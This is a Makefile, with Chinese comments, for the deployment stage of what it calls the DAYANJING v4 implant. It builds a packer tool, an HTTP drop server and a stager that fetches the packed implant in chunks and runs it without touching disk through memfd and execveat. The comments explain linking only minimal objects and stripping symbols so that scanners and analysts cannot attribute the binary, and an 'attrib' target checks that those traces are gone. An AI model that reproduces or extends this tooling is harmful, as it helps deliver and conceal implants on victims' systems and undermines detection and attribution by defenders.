# DAYANJING v4 — 25_deploy Makefile
#
# 职责：把 monolith/implant（单体植入体）做成可投送制品，并投送出去。
#   打包        20_packer / pk_pack_shaped（v4 整头掩码制品）
#   解包校验    20_packer / pk_unpack_shaped（无损还原）
#   分块投递    本层 25_deploy / drop.*（manifest + 内存组装 + 门控）
#   落地执行    20_packer / pk_mexec（memfd + execveat，无文件执行）
#
# 不重复实现任何一层：打包/解包/执行全部复用 20_packer 已有实现，
# 摘要复用 00_crypto 的 sha256（经 20_packer 的目标文件间接提供）。
#
# 注意 -D_GNU_SOURCE：drop_http.c 用 strcasestr 解析 Content-Length。
# 各模块自有 Makefile 各自定义过，这里必须显式带上，否则编译失败。

CC      ?= gcc
CFLAGS  ?= -std=c11 -O2 -Wall -Wextra -Wpedantic -Wshadow -Wstrict-prototypes
CFLAGS  += -D_GNU_SOURCE -D_DEFAULT_SOURCE
CFLAGS  += -Iinclude -I../20_packer/include -I../00_crypto/include

BUILD   := build
# 复用 20_packer 已编译的目标文件（含 crypto_gcm/hash/x25519 与 shaped/pack/mexec）
PACKOBJ := $(wildcard ../20_packer/build/*.o)

# stager 的最小闭包。
#
# stager 是明文投送到目标的第一段代码，它没有制品加密层保护，二进制里
# 每一个可读串都会直接暴露给扫描器。而它实际只需要 4 个符号：
#   sha256 / crypto_constant_time_eq / pk_unpack_shaped / pk_mexec
# 拉进来的最小目标文件闭包就是下面这 6 个（实测求得，不是推测）：
#   shaped(mask/unpack) pack(derive/rand/get32) lzss(解压)
#   mexec(落地) crypto_hash(sha256) crypto_gcm(constant_time_eq)
#
# 原先 PACKOBJ 全量链接，把 bind/binding/artifact/poly/flatten/keyrot/
# c2/c2_frame/crypto_x25519 一并拖进来 —— 它们一个都用不上，却贡献了大量
# 可读串（"dayanjing:packer:bind:v1"、"binding id mismatch" 等）与符号名，
# 直接构成归因特征。
#
# 用 filter 而非硬编码列表：若 20_packer 日后重命名目标文件，这里取到空
# 会导致链接失败（显式、立刻可见），而不是悄悄退化成全量链接。
PACKOBJ_MIN := $(filter ../20_packer/build/shaped.o \
                        ../20_packer/build/pack.o \
                        ../20_packer/build/lzss.o \
                        ../20_packer/build/mexec.o \
                        ../20_packer/build/crypto_hash.o \
                        ../20_packer/build/crypto_gcm.o, $(PACKOBJ))

SRCS    := src/drop.c src/drop_http.c src/pic_exec.c
# stager 不链接 pic_exec.c：它走 dp_asm_exec（ELF + memfd）路径，
# PIC 路径是另一条投递形态，不需要的代码一律不带 —— 每一个多余目标文件
# 都是额外的可读串与符号名。
STAGOBJ := src/drop.c src/drop_http.c
SERVESRC := src/drop_serve.c
STAGSRC := src/drop_stager.c
PACKSRC := src/deploy_pack.c

.PHONY: all test clean attrib

all: $(BUILD)/deploy_pack $(BUILD)/drop_serve $(BUILD)/drop_stager \
     $(BUILD)/test_drop $(BUILD)/test_deploy $(BUILD)/test_pic

$(BUILD):
	mkdir -p $(BUILD)

$(BUILD)/deploy_pack: $(PACKSRC) $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(PACKOBJ) -o $@

$(BUILD)/drop_serve: $(SERVESRC) $(SRCS) $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(SRCS) $(PACKOBJ) -o $@

# -s：剥离符号表。域分离标签已改为异或存放（见 20_packer/pack_int.h），
# 但 pk_* / SHAPE_SALT 这类符号名本身也是特征 —— 它们能告诉分析者
# "这是 dayanjing 的 packer"。stager 不需要被调试，一律剥离。
$(BUILD)/drop_stager: $(STAGSRC) $(STAGOBJ) $(PACKOBJ_MIN) | $(BUILD)
	$(CC) $(CFLAGS) -static -s $< $(STAGOBJ) $(PACKOBJ_MIN) -o $@

$(BUILD)/test_drop: tests/test_drop.c $(SRCS) $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(SRCS) $(PACKOBJ) -o $@

$(BUILD)/test_deploy: tests/test_deploy.c $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(PACKOBJ) -o $@

$(BUILD)/test_pic: tests/test_pic.c $(SRCS) $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(SRCS) $(PACKOBJ) -o $@

# 归因特征自查。
#
# 只断言"stager 里没有"是不够的 —— 若扫描本身写错（大小写、转义、扫了源码
# 而非二进制），它会恒返回 0，于是"通过"成了假象，真正的暴露被掩盖。
# 所以必须带对照组：drop_serve 链接全量 PACKOBJ 且未 strip，必然命中。
#   对照组不命中  -> 扫描器失效，stager 的 0 不可信，判失败
#   实验组命中    -> 收窄未生效，判失败
attrib: $(BUILD)/drop_stager $(BUILD)/drop_serve
	@python3 scripts/attrib_check.py

test: $(BUILD)/test_drop $(BUILD)/test_deploy $(BUILD)/test_pic
	./$(BUILD)/test_drop
	./$(BUILD)/test_deploy
	./$(BUILD)/test_pic

clean:
	rm -rf $(BUILD)
